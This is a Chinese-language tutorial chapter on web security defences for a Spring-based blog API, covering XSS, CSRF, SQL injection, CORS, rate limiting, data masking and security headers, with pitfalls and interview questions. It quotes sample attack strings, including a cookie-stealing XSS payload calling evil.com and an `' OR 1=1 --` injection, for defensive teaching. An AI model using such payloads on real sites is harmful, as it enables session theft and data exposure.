# Chapter 45 Web 安全防护 - 理论篇

## 一、学习定位

44 章把"认证授权"框架架好, 但站点对外暴露还有大量"工程化安全"要做:

- 跨域怎么开口子又不被滥用 (CORS)
- 用户输入直接渲染会被注入脚本 (XSS)
- 用户被骗去点击伪造表单 (CSRF)
- 接口被刷 / 拖垮 (限流 + 验证码)
- SQL 注入 + 命令注入
- 敏感数据落库 / 日志泄漏 (脱敏 + 加密)
- 响应头加固 (CSP / HSTS / X-Frame-Options)

这些是"已经发生过的真实事故", 几乎每个互联网公司都有过相应 P0。本章重点不是背 OWASP Top 10, 而是给博客 API 把这一套全部上线, 并且每一项都有验证手段。

- 优先级: L3 面试高频 + 生产必备
- 预计投入: 4 小时
- 阶段产出: 安全检查清单 (security-checklist.md) + 每项都有自动化验证

## 二、核心威胁与防护对照

### 1. XSS (Cross-Site Scripting)

**原理**: 攻击者把 `<script>` 注入到他人能看到的内容里 (评论 / 文章), 受害者浏览器执行恶意脚本, 偷 cookie / 跳转钓鱼。

**三种分类**:
- **存储型 (Stored)**: 注入物存在 DB, 每次渲染都被攻击。博客评论是高发地。
- **反射型 (Reflected)**: 注入物在 URL 参数, 后端原样返回。搜索框最常见。
- **DOM 型**: 前端 JS 用 `innerHTML` 拼用户输入。后端无关, 前端责任。

**防护**:
- 输入侧用 **Jsoup Safelist** 清洗富文本 (保留 `<p><b><a>`, 去 `<script><iframe><img onerror>`)
- 输出侧由前端框架默认转义 (React `{val}` 自动转义; `dangerouslySetInnerHTML` 才危险)
- 设置 `Content-Security-Policy: default-src 'self'`, 即使被注入也无法外联恶意域

### 2. CSRF (Cross-Site Request Forgery)

**原理**: 用户登录了 a.com, 然后访问 evil.com, 后者 `<form action=a.com/transfer>` 自动提交。浏览器自动带上 a.com 的 cookie, 后端无法分辨。

**前提**: **基于 Cookie 的会话** + **写操作没有用户主动校验**。

**防护**:
- 用 **SameSite=Lax / Strict cookie** (现代浏览器默认 Lax)
- CSRF Token: 服务端下发随机串, 每次写操作必须带上 (Spring Security 默认开)
- 用 **JWT Header 鉴权** 而非 cookie → 天然不受 CSRF 影响 (浏览器不会自动给跨域请求带 Authorization Header)

> JWT 后端可关 CSRF; Cookie 后端必须开。

### 3. SQL 注入

**原理**: 拼接 SQL 字符串。`"SELECT * FROM user WHERE name='" + input + "'"` 输入 `' OR 1=1 --` 拖库。

**防护**:
- **PreparedStatement / `#{}`**: MyBatis 占位符是 PreparedStatement, 参数走绑定不拼 SQL
- **`${}` 必须白名单**: 排序字段 / 表名只能用 `${}`, 但要校验是否在允许集合
- 数据库账号最小权限 (App 账号不能 DROP)

### 4. CORS

**原理**: 浏览器同源策略阻止跨域 AJAX。后端通过 Access-Control-Allow-Origin 给特定前端开口子。

**陷阱**:
- `Allow-Origin: *` + `Allow-Credentials: true` 浏览器拒绝
- 反射型 CORS: 后端把请求 Origin 直接回写 → 所有站点都能访问。必须**白名单**
- 不区分预检 OPTIONS 和实际请求, OPTIONS 加了鉴权 → preflight 401

### 5. 限流 (Rate Limiting)

**目的**: 防爆破、防爬、防 DDoS、保护下游。

**算法**:
- **固定窗口**: 简单但临界点突刺
- **滑动窗口**: Redis ZSET 实现
- **令牌桶 (Token Bucket)**: 允许突发, 长期均速。**Bucket4j 默认算法**
- **漏桶 (Leaky Bucket)**: 严格均速

**键的选择**:
- 全局 (服务保护)
- 按 IP (反爬)
- 按用户 (公平)
- 按业务 (登录 / 发帖分别限)

### 6. 敏感数据保护

| 数据 | 措施 |
|---|---|
| 密码 | BCrypt (单向哈希) |
| 手机号 / 邮箱 | DB 可存明文, 但日志和接口返回**脱敏** |
| 身份证 / 银行卡 | AES 加密落库, 单独密钥管理 |
| Token / API Key | 不打日志, 不入 URL |
| 业务密文 | 字段级加密 + 审计 |

### 7. 安全响应头

| Header | 作用 |
|---|---|
| `X-Content-Type-Options: nosniff` | 禁止浏览器猜 MIME, 防 IE 把 JSON 当 HTML 执行 |
| `X-Frame-Options: DENY` | 禁止被 iframe 嵌入, 防点击劫持 |
| `Content-Security-Policy` | 限制能加载的资源域 |
| `Strict-Transport-Security` | 强制 HTTPS |
| `Referrer-Policy: same-origin` | 限制 Referrer 泄漏 |

## 三、工作原理

| 维度 | 要点 | 你需要能说清 |
|---|---|---|
| 入口 | 哪些层负责 | Spring Security 链 (CORS/CSRF/Header) + 业务层 (XSS 清洗) + 中间件 (Nginx WAF / 限流) |
| 配置 | 关键参数 | CSP 策略串、CORS 白名单、限流速率、HSTS 时长 |
| 执行 | 请求生命周期 | OPTIONS preflight → CORS Filter → Auth → 业务 → 响应头注入 → 限流 (前置 or 后置) |
| 边界 | 失败模式 | Origin 白名单遗漏内网域名 / 限流键被绕 / CSP 报告模式 vs 强制模式 |
| 验证 | 证明手段 | OWASP ZAP / curl + 头检查 / 自动化测试用例覆盖每种攻击 |

## 四、项目落地清单

接入到博客 API 后, 你应该有:

1. `SecurityConfig` 里 CORS + Header 配置, 含白名单可在 `application.yml` 配置
2. 文章 / 评论 Service 入库前过 `HtmlSanitizer.clean()`
3. 全局限流 Filter (IP + 用户双维度) , 用 Bucket4j 或 Redis Lua
4. 登录接口单独限流 (5 次/分钟/IP), 防爆破
5. 排序 / 筛选字段白名单
6. 敏感字段 (phone) 用 `@JsonSerialize(using=MaskedSerializer.class)`
7. `application-prod.yml` 关闭 actuator 公开端点、关闭 Swagger
8. `docs/security-checklist.md` 列出已实施的 12+ 项, 可作为面试谈资

## 五、常见坑

| 坑 | 后果 | 处理 |
|---|---|---|
| 只在 Controller 转义, 定时任务直接写 DB | 一个入口漏就全漏 | Sanitize 放 Service 入口 |
| 限流键用 `request.getRemoteAddr()` | Nginx 后全部 IP 变成 LB | 取 `X-Forwarded-For` 第一段, 还要校验来源可信 |
| CSP 直接上 enforce | 静态资源 / 第三方 SDK 全挂 | 先 `Content-Security-Policy-Report-Only` 跑一周 |
| 日志打印 request.toString() | 密码 / token 全进日志 | 入口拦截 / Logback 脱敏 / 不打 body |
| 错误信息回显 stacktrace | 框架版本、依赖路径都泄漏 | `server.error.include-stacktrace=never` |
| 接口直接返回完整 user 实体 | passwordHash 都返了 | Controller 出口用 VO |
| 测试环境密钥进生产 | 单点泄漏 | 密钥管理 (KMS / Vault), 环境隔离 |

## 六、面试高频问题

1. 用户在评论里发了 `<img src=x onerror=fetch('//evil.com/'+document.cookie)>`, 你的后端有哪些层可以拦?
2. 为什么 JWT 后端可以关 CSRF? Cookie 后端为什么不能关?
3. 限流要做在 Spring Filter 里还是 Nginx 里? 各自的优劣是什么?
4. CSP 策略 `default-src 'self'` 太严格导致第三方统计 JS 加载不了, 你怎么调?
5. 排序参数怎么防 SQL 注入? `ORDER BY ${sortBy}` 在什么前提下是安全的?
6. 一个接口被 DDoS, 你的处置预案是? (限流降级 / 黑名单 / WAF / Nginx 限速 / CDN 防护)

## 七、对照表: 攻击 → 检测 → 防护

| 攻击 | 浏览器表现 | 检测手段 | 后端防护 |
|---|---|---|---|
| 存储型 XSS | 渲染时执行脚本 | OWASP ZAP / 手测 `<script>` | Jsoup 清洗 + CSP |
| 反射型 XSS | URL 参数原样回显 | 模糊测试 | 模板自动转义 + 参数白名单 |
| CSRF | 站外页面诱导提交 | 看登录态 + 站外 form 是否能 200 | Token / SameSite / JWT Header |
| SQL 注入 | 报错 / 查到不该查的数据 | sqlmap | PreparedStatement |
| CORS 滥用 | 跨域被允许且带 cookie | 模拟 Origin | 严格白名单 |
| 暴力破解 | 短时间海量登录 | 日志聚合 / 频率分析 | 限流 + 验证码 + 账户锁 |
| 越权 | 改 id 能查别人数据 | 自动化 IDOR 扫 | `@PreAuthorize` + 数据级 |
